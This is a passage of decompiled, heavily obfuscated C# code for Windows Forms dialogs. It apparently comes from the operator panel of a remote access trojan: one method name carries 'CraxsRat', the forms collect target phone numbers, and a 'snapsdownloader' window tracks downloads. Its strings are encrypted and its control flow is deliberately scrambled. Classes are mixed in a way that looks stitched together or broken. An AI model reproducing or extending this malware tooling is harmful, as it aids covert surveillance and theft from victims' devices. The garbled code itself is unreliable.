              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label2
    {
      get => ((tipfirewalltracker) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._Label2 = value;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((tipfirewalltracker) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual DrakeUICheckBox checkall
    {
      get => ((tipfirewalltracker) this)._checkall;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkall_MouseClick);
label_1:
        int num1 = -665450371;
        DrakeUICheckBox checkall;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((-(num1 ^ ~364723376 + (--160195973 - -1473362471 * (-512675837 - 1177725409)) ^ 761496333 * (~-334709981 + --1390328086) - -(-1829781863 - -1348713722 - ~1317488109)) * -1548392045 ^ 1671151593) * 341529397)) % 9U)
          {
            case 0:
              checkall.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -138958893 ^ 1036503473;
              continue;
            case 1:
              goto label_3;
            case 2:
              ((tipfirewalltracker) this)._checkall = value;
              num1 = -86046690;
              continue;
            case 3:
              int num3 = checkall == null ? 1114669308 : (num3 = -280354908);
              num1 = num3 ^ (int) num2 * 1314056480;
              continue;
            case 4:
              goto label_1;
            case 5:
              checkall.MouseClick += mouseEventHandler;
              num1 = (int) num2 * -1553361332 ^ 571513928;
              continue;
            case 6:
              int num4 = checkall == null ? 949445584 : (num4 = 1590385368);
              num1 = num4 ^ (int) num2 * -1189393108;
              continue;
            case 7:
              checkall = ((tipfirewalltracker) this)._checkall;
              num1 = (int) num2 * 292905219 ^ -1552487076;
              continue;
            case 8:
              checkall = ((tipfirewalltracker) this)._checkall;
              num1 = (int) num2 * 48583191 ^ 1130412342;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      this.DialogResult = DialogResult.Cancel;
label_1:
      int num1 = 2018807584;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-(num1 * 568162749 ^ -~(-2125473957 - 673309532) - (~--1105623954 + (459161884 - -1673466152 + (-1956715308 - 448440692)))) * 231982939)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.Close();
            num1 = (int) num2 * -1067146299 ^ 202669550;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void DrakeUIButtonIcon1_click(object sender, EventArgs e)
    {
      if (this.checkall.Checked)
        goto label_4;
label_1:
      int num1 = 1693913325;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(-134991248 - -783195897 - -(~(1277827813 * (585441069 - 1113468145)) - (num2 + -691260961 * ~(--768108118 ^ ~-2085560780 ^ ~(-1361309112 ^ -914725174)) ^ (-957234984 - 221093715 - (-195543626 - 619921853) ^ -~-289391660) - (-1617727956 + ~(682223 - -836916478)))))) % 7U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num3 * 2115170180 ^ -718859281;
            continue;
          case 2:
            int num4 = this.numslist.Items.Count != 0 ? -1980163591 : (num4 = -94554059);
            num1 = num4 ^ (int) num3 * 302314683;
            continue;
          case 3:
            int num5 = (int) Interaction.MsgBox((object) EXGuarder.\u00308564D40);
            num1 = (int) num3 * 197658312 ^ -1431582959;
            continue;
          case 4:
            goto label_4;
          case 5:
            this.Close();
            num1 = (int) num3 * 1850791803 ^ 2019552115;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_4:
      this.DialogResult = DialogResult.OK;
      num1 = -196632402;
      goto label_2;
    }

    private void Phonetext_KeyPress(object sender, KeyPressEventArgs e)
    {
      if (Strings.Asc(e.KeyChar) == 8)
        return;
label_1:
      int num1 = 90395620;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-((-(-(-1860191949 * -2009020781) - ((-359869535 ^ 1344082821 * -345028649) + (553919589 - 2071799082 ^ 237016341))) - num2) * 1824095357) - -(820124503 ^ -307450712)) * 1767475057 * -1066503395)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_6;
          case 2:
            int num4 = !(Strings.Asc(e.KeyChar) < 48 | Strings.Asc(e.KeyChar) > 57) ? 1799040943 : (num4 = 617428713);
            num1 = num4 ^ (int) num3 * -1550923232;
            continue;
          case 3:
            e.Handled = true;
            num1 = (int) num3 * 1147304192 ^ -1427199377;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcdsatyud(object sender, EventArgs e)
    {
    }

    private void Checkall_Load(object sender, EventArgs e)
    {
    }

    private void Addnum_Click(object sender, EventArgs e)
    {
      if (!(string.IsNullOrEmpty(this.phonetext.Text) | string.IsNullOrWhiteSpace(this.phonetext.Text)))
        goto label_6;
label_1:
      int num1 = 280134549;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((--904276494 + ~-1448959872 - (1140335137 - -1552108542 ^ -1051094609) - ~(num2 * -1191430151) - ~(1481963387 - 1451465023)) * -693800077)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_6;
          case 2:
            int num4 = (int) Interaction.MsgBox((object) EXGuarder.\u00340770B69);
            num1 = (int) num3 * -1759404976 ^ 1499710393;
            continue;
          case 3:
            num1 = (int) num3 * 1328945257 ^ -1662454531;
            continue;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.numslist.Items.Add((object) this.phonetext.Text);
      num1 = 700295545;
      goto label_2;
    }

    private void Remnum_Click(object sender, EventArgs e)
    {
      if (this.numslist.Items.Count != 0)
        goto label_4;
label_1:
      int num1 = 204610361;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~-(-(num1 - ((-1471160568 - 1449315664 + -1919984464) * -1669372629 + (-187692685 * (416906501 * 1460540036) + (-1449883059 - 1612034915 + ~117282847)) - (1020592723 + 1482661239))) ^ (1616358425 ^ 1012396828) - (1809712001 - 2116034150) ^ 1146962091)) % 6U)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_4;
          case 2:
            goto label_1;
          case 3:
            int num3 = (int) Interaction.MsgBox((object) EXGuarder.\u003090E6631);
            num1 = (int) num2 * 1992178368 ^ -1278364622;
            continue;
          case 5:
            goto label_6;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_6:
      int num4 = (int) Interaction.MsgBox((object) EXGuarder.\u0031226266D);
      return;
label_8:
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (!ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 0, Operators.SubtractObject(NewLateBinding.LateGet(this.numslist.SelectedItem, (Type) null, EXGuarder.\u0033448502C, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) 1), (object) 1, ref LoopForResult, ref CounterResult))
        return;
      do
      {
        try
        {
          this.numslist.Items.Remove(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(this.numslist.SelectedItem, new object[1]
          {
            CounterResult
          }, (string[]) null)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_11:
          int num5 = -1115855380;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) -~-(-(num5 - ((-1471160568 - 1449315664 + -1919984464) * -1669372629 + (-187692685 * (416906501 * 1460540036) + (-1449883059 - 1612034915 + ~117282847)) - (1020592723 + 1482661239))) ^ (1616358425 ^ 1012396828) - (1809712001 - 2116034150) ^ 1146962091)) % 3U)
            {
              case 0:
                goto label_11;
              case 2:
                ProjectData.ClearProjectError();
                num5 = (int) num6 * -1777419091 ^ 1624910514;
                continue;
              default:
                goto label_15;
            }
          }
        }
label_15:;
      }
      while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      return;
label_4:
      num1 = !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(this.numslist.SelectedItem, (Type) null, EXGuarder.\u0033448502C, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) 0, false) ? -36131662 : (num1 = -1421787857);
      goto label_2;
    }

    private void Selectlist_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
label_1:
      int num1 = -2040985545;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~(num1 ^ ~-739279706 - (~120628986 + (620527493 - 670284533)) ^ ~~(539004401 * -1968990110) ^ 1580230702 - (91986465 + (-400523389 ^ -1586506892 - 366889701))) - ((-1633536870 - 2147224050 ^ 536170379 * -494449290) - -589223083 * -1708443380) ^ 793627563) * -2015683363 * -1062346859)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            openFileDialog.InitialDirectory = EXGuarder.\u003351D6D34;
            openFileDialog.Title = EXGuarder.\u0031D670703;
            num1 = (int) num2 * 726235397 ^ -1178862824;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      openFileDialog.Filter = EXGuarder.\u0030F6A553A;
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      try
      {
        string fileName = openFileDialog.FileName;
        if (string.IsNullOrEmpty(fileName))
          return;
label_7:
        int num3 = 1460025814;
        int index;
        int num4;
        string Expression;
        string[] strArray;
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) ((~(num3 ^ ~-739279706 - (~120628986 + (620527493 - 670284533)) ^ ~~(539004401 * -1968990110) ^ 1580230702 - (91986465 + (-400523389 ^ -1586506892 - 366889701))) - ((-1633536870 - 2147224050 ^ 536170379 * -494449290) - -589223083 * -1708443380) ^ 793627563) * -2015683363 * -1062346859)) % 13U)
          {
            case 0:
              goto label_7;
            case 1:
              strArray = File.ReadAllLines(fileName);
              num3 = (int) num5 * 1324886271 ^ 1527979474;
              continue;
            case 2:
              num4 = checked (strArray.Length - 1);
              num3 = (int) num5 * -941786525 ^ -1808211321;
              continue;
            case 3:
              num3 = (int) num5 * 1247216211 ^ -1400791663;
              continue;
            case 4:
              int num6 = strArray.Length <= 0 ? -1665869607 : (num6 = 269597840);
              num3 = num6 ^ (int) num5 * -76618407;
              continue;
            case 5:
              int num7;
              num3 = num7 = index <= num4 ? -602254031 : (num7 = -193942416);
              continue;
            case 6:
              checked { ++index; }
              num3 = 1026111213;
              continue;
            case 7:
              this.numslist.Items.Add((object) Expression);
              num3 = (int) num5 * -738247451 ^ -2119831100;
              continue;
            case 8:
              int num8 = string.IsNullOrWhiteSpace(fileName) ? -1794839990 : (num8 = -2004747295);
              num3 = num8 ^ (int) num5 * 709799182;
              continue;
            case 9:
              goto label_22;
            case 10:
              int num9 = !Versioned.IsNumeric((object) Expression) ? -2139743933 : (num9 = 379752466);
              num3 = num9 ^ (int) num5 * -1449678323;
              continue;
            case 11:
              Expression = strArray[index].Replace(EXGuarder.\u0034B221175, EXGuarder.\u0032F4A3F67);
              num3 = 1366363640;
              continue;
            case 12:
              index = 0;
              num3 = (int) num5 * 839148593 ^ -1684908409;
              continue;
            default:
              goto label_23;
          }
        }
label_22:
        return;
label_23:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Checkall_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkall.Checked)
        goto label_9;
label_1:
      int num1 = -73878394;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((num1 ^ -(-178093689 * -(-1829724295 * 378824589)) * -1722505757) + ~-(-1950867052 + 204399035 * 155598389) ^ (-1632565456 ^ 2121251309) + (-1704226406 - 2069365772) - (~1257938072 ^ -995045083) ^ -(1789248195 - 1685500249)) * 519525675 - 874962409)) % 12U)
        {
          case 0:
            this.phonetext.Enabled = false;
            num1 = (int) num2 * -121229750 ^ -846981739;
            continue;
          case 1:
            goto label_3;
          case 2:
            this.numslist.Items.Clear();
            num1 = (int) num2 * -730418120 ^ -1819139894;
            continue;
          case 3:
            this.remnum.Enabled = false;
            num1 = (int) num2 * -1397875185 ^ -1951901705;
            continue;
          case 4:
            this.addnum.Enabled = false;
            num1 = (int) num2 * 1824014866 ^ -1065251688;
            continue;
          case 5:
            this.phonetext.Text = EXGuarder.\u00377466104;
            num1 = (int) num2 * 1776600493 ^ 196997626;
            continue;
          case 6:
            this.addnum.Enabled = true;
            this.remnum.Enabled = false;
            num1 = (int) num2 * -1234399700 ^ -879805398;
            continue;
          case 7:
            this.phonetext.Enabled = true;
            num1 = (int) num2 * 2072812301 ^ -292440221;
            continue;
          case 8:
            goto label_1;
          case 9:
            this.numslist.Enabled = false;
            this.selectlist.Enabled = false;
            num1 = (int) num2 * 116027022 ^ 1015923073;
            continue;
          case 10:
            goto label_9;
          case 11:
            this.numslist.Enabled = true;
            this.selectlist.Enabled = true;
            num1 = (int) num2 * -1269319432 ^ -2112468947;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:
      return;
label_9:
      this.phonetext.Text = EXGuarder.\u00377466104;
      num1 = -833158952;
      goto label_2;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -276844445;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~34285328 - (-((-(-1122140107 - -638123194) ^ --1702709803 * -1861127185) + ~~(645343454 * -1260483221) - num2 * -575566535) - (1307952669 * -495442019 - ~-1515257)))) % 4U)
          {
            case 0:
              ((tipfirewalltracker) this).components.Dispose();
              num1 = (int) num3 * -28537284 ^ 801510417;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              int num4 = ((tipfirewalltracker) this).components == null ? 1851350408 : (num4 = 1131444439);
              num1 = num4 ^ (int) num3 * -2040515837;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((snapsdownloader) this).lefttext = new Label();
      ((snapsdownloader) this).finishedtext = new Label();
label_1:
      int num1 = 1239877982;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~-(-num1 ^ 1325951819 * (-1281577320 * -400868807) - 388654898) - (1811880453 + 457719130))) % 92U)
        {
          case 0:
            ((snapsdownloader) this).DrakeUIButtonIcon12.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -265281213 ^ 1291054517;
            continue;
          case 1:
            ((snapsdownloader) this).statustext.Font = new Font(EXGuarder.\u00340723478, 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 809742533 ^ -327547490;
            continue;
          case 2:
            ((snapsdownloader) this).Panel1.Controls.Add((Control) ((snapsdownloader) this).DrakeUIButtonIcon12);
            num1 = (int) num2 * -729159779 ^ 1440364013;
            continue;
          case 3:
            ((snapsdownloader) this).DrakeUIButtonIcon1.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((snapsdownloader) this).DrakeUIButtonIcon1.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((snapsdownloader) this).DrakeUIButtonIcon1.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((snapsdownloader) this).DrakeUIButtonIcon1.Size = new Size(30, 44);
            num1 = (int) num2 * 1570435646 ^ -1439136840;
            continue;
          case 4:
            ((snapsdownloader) this).DrakeUIButtonIcon12 = new DrakeUIButtonIcon();
            num1 = (int) num2 * -463390593 ^ 922910344;
            continue;
          case 5:
            ((snapsdownloader) this).clipic.Name = EXGuarder.\u0030C634C5B;
            ((snapsdownloader) this).clipic.Size = new Size(53, 44);
            ((snapsdownloader) this).clipic.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -411778536 ^ 1366010505;
            continue;
          case 6:
            ((snapsdownloader) this).infotext.Location = new Point(53, 0);
            num1 = (int) num2 * -564443056 ^ 1890770607;
            continue;
          case 7:
            ((snapsdownloader) this).DrakeUIButtonIcon12.Style = UIStyle.Custom;
            ((snapsdownloader) this).DrakeUIButtonIcon12.StyleCustomMode = true;
            num1 = (int) num2 * -424858915 ^ 1960959909;
            continue;
          case 8:
            ((snapsdownloader) this).lefttext.Location = new Point(0, 156);
            num1 = (int) num2 * 1908461363 ^ 1134038190;
            continue;
          case 9:
            ((snapsdownloader) this).DrakeUIButtonIcon12.SymbolSize = 25;
            num1 = (int) num2 * -1653372006 ^ 362020789;
            continue;
          case 10:
            this.SuspendLayout();
            num1 = (int) num2 * -892852611 ^ -1816327959;
            continue;
          case 11:
            ((snapsdownloader) this).statustext.TabIndex = 57;
            ((snapsdownloader) this).statustext.Text = EXGuarder.\u00345511820;
            ((snapsdownloader) this).Label1.Dock = DockStyle.Top;
            num1 = (int) num2 * -820039356 ^ -1497923741;
            continue;
          case 13:
            ((snapsdownloader) this).clipic = new PictureBox();
            num1 = (int) num2 * 1167344308 ^ -534209484;
            continue;
          case 14:
            this.Controls.Add((Control) ((snapsdownloader) this).finishedtext);
            this.Controls.Add((Control) ((snapsdownloader) this).totaltext);
            num1 = (int) num2 * 1544193488 ^ -1301354484;
            continue;
          case 15:
            this.Name = EXGuarder.\u003506B5F2D;
            num1 = (int) num2 * 727407666 ^ 423413787;
            continue;
          case 16:
            ((ISupportInitialize) ((snapsdownloader) this).clipic).EndInit();
            num1 = (int) num2 * 2018153648 ^ -1137763661;
            continue;
          case 17:
            ((snapsdownloader) this).finishedtext.Name = EXGuarder.\u0035C2F3341;
            num1 = (int) num2 * 186447921 ^ 1917666440;
            continue;
          case 18:
            ((snapsdownloader) this).clipic.TabIndex = 0;
            ((snapsdownloader) this).clipic.TabStop = false;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * -1952615231 ^ -359493591;
            continue;
          case 19:
            ((snapsdownloader) this).statustext.Name = EXGuarder.\u0030A730504;
            num1 = (int) num2 * -1332161712 ^ 1039574904;
            continue;
          case 20:
            ((snapsdownloader) this).Label1.Font = new Font(EXGuarder.\u00340723478, 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 190283354 ^ 109133132;
            continue;
          case 21:
            ((snapsdownloader) this).Panel1.Size = new Size(764, 44);
            num1 = (int) num2 * 888210482 ^ 1946163766;
            continue;
          case 22:
            ((snapsdownloader) this).DrakeUIButtonIcon12.Name = EXGuarder.\u003203F613B;
            ((snapsdownloader) this).DrakeUIButtonIcon12.RectColor = Color.Black;
            num1 = (int) num2 * -1193097597 ^ 2073350233;
            continue;
          case 23:
            ((snapsdownloader) this).lefttext.Name = EXGuarder.\u0031D103722;
            ((snapsdownloader) this).lefttext.Size = new Size(764, 28);
            num1 = (int) num2 * 647396528 ^ 197648928;
            continue;
          case 24:
            ((snapsdownloader) this).DrakeUIButtonIcon1.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((snapsdownloader) this).DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u00340723478, 9f);
            num1 = (int) num2 * 2066913577 ^ -1608781617;
            continue;
          case 25:
            ((snapsdownloader) this).Bbar.TabIndex = 54;
            num1 = (int) num2 * 858444168 ^ 924623670;
            continue;
          case 26:
            ((snapsdownloader) this).DrakeUIButtonIcon12.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -489775736 ^ -1118943171;
            continue;
          case 27:
            ((snapsdownloader) this).DrakeUIButtonIcon12.Symbol = 61527;
            num1 = (int) num2 * -1048499885 ^ 565459105;
            continue;
          case 28:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 1620704773 ^ -272005962;
            continue;
          case 29:
            ((snapsdownloader) this).Label1.Location = new Point(0, 44);
            num1 = (int) num2 * -2108880581 ^ 1868433710;
            continue;
          case 30:
            this.TopMost = true;
            num1 = (int) num2 * -1030129351 ^ 1165721423;
            continue;
          case 31:
            ((snapsdownloader) this).infotext.TextAlign = ContentAlignment.MiddleLeft;
            ((snapsdownloader) this).DrakeUIButtonIcon12.Cursor = Cursors.Hand;
            num1 = (int) num2 * -791628814 ^ -442501787;
            continue;
          case 32:
            ((snapsdownloader) this).DrakeUIButtonIcon1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((snapsdownloader) this).DrakeUIButtonIcon1.Location = new Point(704, 0);
            num1 = (int) num2 * 1212741282 ^ 436103692;
            continue;
          case 33:
            ((snapsdownloader) this).infotext.TabIndex = 49;
            ((snapsdownloader) this).infotext.Text = EXGuarder.\u0033E0B6151;
            num1 = (int) num2 * 1453458141 ^ 1059900515;
            continue;
          case 34:
            ((snapsdownloader) this).DrakeUIButtonIcon1.FillColor = Color.Black;
            num1 = (int) num2 * -1834686926 ^ -2114684913;
            continue;
          case 35:
            ((snapsdownloader) this).finishedtext.Text = EXGuarder.\u00359090F01;
            num1 = (int) num2 * 365743312 ^ -368318777;
            continue;
          case 36:
            ((snapsdownloader) this).DrakeUIButtonIcon12.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1599130177 ^ -1090112641;
            continue;
          case 37:
            ((snapsdownloader) this).Panel1.Name = EXGuarder.\u0032F35555C;
            num1 = (int) num2 * -2103147922 ^ -1836389634;
            continue;
          case 38:
            ((snapsdownloader) this).totaltext.Location = new Point(0, 100);
            ((snapsdownloader) this).totaltext.Name = EXGuarder.\u003701B365E;
            ((snapsdownloader) this).totaltext.Size = new Size(764, 28);
            num1 = (int) num2 * -1849822399 ^ -1833125539;
            continue;
          case 39:
            ((snapsdownloader) this).Bbar.RectColor = Color.Red;
            ((snapsdownloader) this).Bbar.Size = new Size(764, 23);
            ((snapsdownloader) this).Bbar.Style = UIStyle.Custom;
            num1 = (int) num2 * -412745602 ^ -1953586196;
            continue;
          case 40:
            ((snapsdownloader) this).lefttext.Dock = DockStyle.Top;
            ((snapsdownloader) this).lefttext.Font = new Font(EXGuarder.\u00340723478, 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -101035301 ^ -1384957273;
            continue;
          case 41:
            ((snapsdownloader) this).DrakeUIButtonIcon1.Margin = new Padding(4);
            ((snapsdownloader) this).DrakeUIButtonIcon1.Name = EXGuarder.\u0033C3D4E13;
            ((snapsdownloader) this).DrakeUIButtonIcon1.RectColor = Color.Black;
            num1 = (int) num2 * 1651343920 ^ 1207255741;
            continue;
          case 42:
            ((snapsdownloader) this).DrakeUIButtonIcon1.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -560167664 ^ -1600111774;
            continue;
          case 43:
            ((snapsdownloader) this).finishedtext.TabIndex = 58;
            num1 = (int) num2 * 1794142087 ^ -501062053;
            continue;
          case 44:
            ((snapsdownloader) this).Panel1.Controls.Add((Control) ((snapsdownloader) this).clipic);
            ((snapsdownloader) this).Panel1.Dock = DockStyle.Top;
            ((snapsdownloader) this).Panel1.Location = new Point(0, 0);
            num1 = (int) num2 * -1297147440 ^ -1857025212;
            continue;
          case 45:
            ((snapsdownloader) this).Panel1.TabIndex = 55;
            num1 = (int) num2 * -1229920681 ^ -2136236397;
            continue;
          case 46:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u00344230579;
            num1 = (int) num2 * -1700294646 ^ 580982121;
            continue;
          case 47:
            ((snapsdownloader) this).Bbar.Text = EXGuarder.\u00362574702;
            num1 = (int) num2 * 442814477 ^ 884774836;
            continue;
          case 48:
            ((snapsdownloader) this).Panel1.Controls.Add((Control) ((snapsdownloader) this).DrakeUIButtonIcon1);
            ((snapsdownloader) this).Panel1.Controls.Add((Control) ((snapsdownloader) this).infotext);
            num1 = (int) num2 * -587587050 ^ 1434190553;
            continue;
          case 49:
            this.Controls.Add((Control) ((snapsdownloader) this).statustext);
            num1 = (int) num2 * -1680518851 ^ 622034432;
            continue;
          case 50:
            ((snapsdownloader) this).statustext = new Label();
            ((snapsdownloader) this).Label1 = new Label();
            num1 = (int) num2 * 182836149 ^ 515904318;
            continue;
          case 51:
            ((snapsdownloader) this).totaltext = new Label();
            num1 = (int) num2 * -240801833 ^ 381678732;
            continue;
          case 52:
            ((snapsdownloader) this).totaltext.TabIndex = 56;
            ((snapsdownloader) this).totaltext.Text = EXGuarder.\u00334157706;
            ((snapsdownloader) this).statustext.Dock = DockStyle.Top;
            num1 = (int) num2 * 897602108 ^ -2142425164;
            continue;
          case 53:
            ((snapsdownloader) this).statustext.Size = new Size(764, 28);
            num1 = (int) num2 * 1016983434 ^ 1988689892;
            continue;
          case 54:
            ((snapsdownloader) this).Label1.Name = EXGuarder.\u0031B594030;
            ((snapsdownloader) this).Label1.Size = new Size(764, 28);
            num1 = (int) num2 * 1928427746 ^ -1504744112;
            continue;
          case 55:
            ((snapsdownloader) this).DrakeUIButtonIcon12.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -670150454 ^ -1904038411;
            continue;
          case 56:
            ((snapsdownloader) this).DrakeUIButtonIcon12.Size = new Size(30, 44);
            num1 = (int) num2 * -2012942374 ^ -131152442;
            continue;
          case 57:
            ((snapsdownloader) this).Panel1.SuspendLayout();
            ((ISupportInitialize) ((snapsdownloader) this).clipic).BeginInit();
            num1 = (int) num2 * -1929717329 ^ -2042457294;
            continue;
          case 58:
            this.ClientSize = new Size(764, 223);
            num1 = (int) num2 * -619253887 ^ 1631321451;
            continue;
          case 59:
            ((snapsdownloader) this).DrakeUIButtonIcon12.FillColor = Color.Black;
            ((snapsdownloader) this).DrakeUIButtonIcon12.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((snapsdownloader) this).DrakeUIButtonIcon12.Font = new Font(EXGuarder.\u00340723478, 9f);
            num1 = (int) num2 * -180941096 ^ 64162330;
            continue;
          case 60:
            ((snapsdownloader) this).DrakeUIButtonIcon12.Dock = DockStyle.Right;
            num1 = (int) num2 * 1835395854 ^ -1828561738;
            continue;
          case 61:
            ((snapsdownloader) this).Bbar = new DrakeUIProcessBar();
            ((snapsdownloader) this).Panel1 = new Panel();
            ((snapsdownloader) this).DrakeUIButtonIcon1 = new DrakeUIButtonIcon();
            ((snapsdownloader) this).infotext = new Label();
            num1 = (int) num2 * -158062684 ^ 713823687;
            continue;
          case 62:
            ((snapsdownloader) this).Panel1.ResumeLayout(false);
            num1 = (int) num2 * -1063937566 ^ 294802979;
            continue;
          case 63:
            this.BackColor = Color.Black;
            num1 = (int) num2 * 1956758099 ^ -254671812;
            continue;
          case 64:
            ((snapsdownloader) this).DrakeUIButtonIcon1.Dock = DockStyle.Right;
            num1 = (int) num2 * -791253624 ^ 952766901;
            continue;
          case 65:
            ((snapsdownloader) this).DrakeUIButtonIcon1.Symbol = 61564;
            ((snapsdownloader) this).DrakeUIButtonIcon1.SymbolSize = 25;
            num1 = (int) num2 * 462687417 ^ -935541762;
            continue;
          case 66:
            ((snapsdownloader) this).Bbar.FillColor = Color.Black;
            ((snapsdownloader) this).Bbar.Font = new Font(EXGuarder.\u003132B1935, 12f);
            num1 = (int) num2 * 295892907 ^ -1747922760;
            continue;
          case 67:
            ((snapsdownloader) this).Bbar.ForeColor = Color.Red;
            ((snapsdownloader) this).Bbar.Location = new Point(0, 200);
            num1 = (int) num2 * -112225045 ^ -104133247;
            continue;
          case 68:
            ((snapsdownloader) this).DrakeUIButtonIcon12.Location = new Point(734, 0);
            ((snapsdownloader) this).DrakeUIButtonIcon12.Margin = new Padding(4);
            num1 = (int) num2 * 568283938 ^ 504963861;
            continue;
          case 69:
            this.Controls.Add((Control) ((snapsdownloader) this).Panel1);
            num1 = (int) num2 * -2076081649 ^ 66635233;
            continue;
          case 70:
            goto label_1;
          case 71:
            ((snapsdownloader) this).lefttext.Text = EXGuarder.\u0035D443114;
            ((snapsdownloader) this).finishedtext.Dock = DockStyle.Top;
            num1 = (int) num2 * -2090356123 ^ -515023966;
            continue;
          case 72:
            ((snapsdownloader) this).DrakeUIButtonIcon1.TabIndex = 51;
            num1 = (int) num2 * 185759256 ^ 25776274;
            continue;
          case 73:
            ((snapsdownloader) this).DrakeUIButtonIcon1.StyleCustomMode = true;
            num1 = (int) num2 * 240214652 ^ 1951232452;
            continue;
          case 74:
            this.Controls.Add((Control) ((snapsdownloader) this).Label1);
            num1 = (int) num2 * 1401140032 ^ -359970400;
            continue;
          case 75:
            this.Controls.Add((Control) ((snapsdownloader) this).Bbar);
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            num1 = (int) num2 * -315923860 ^ -420204090;
            continue;
          case 76:
            ((snapsdownloader) this).statustext.Location = new Point(0, 72);
            num1 = (int) num2 * 818205885 ^ -1775423586;
            continue;
          case 77:
            ((snapsdownloader) this).lefttext.TabIndex = 59;
            num1 = (int) num2 * -2080999696 ^ 652056110;
            continue;
          case 78:
            ((snapsdownloader) this).DrakeUIButtonIcon12.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 97701880 ^ 1500861387;
            continue;
          case 79:
            ((snapsdownloader) this).DrakeUIButtonIcon1.Style = UIStyle.Custom;
            num1 = (int) num2 * 656794176 ^ -1456250256;
            continue;
          case 80:
            ((snapsdownloader) this).totaltext.Dock = DockStyle.Top;
            ((snapsdownloader) this).totaltext.Font = new Font(EXGuarder.\u00340723478, 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
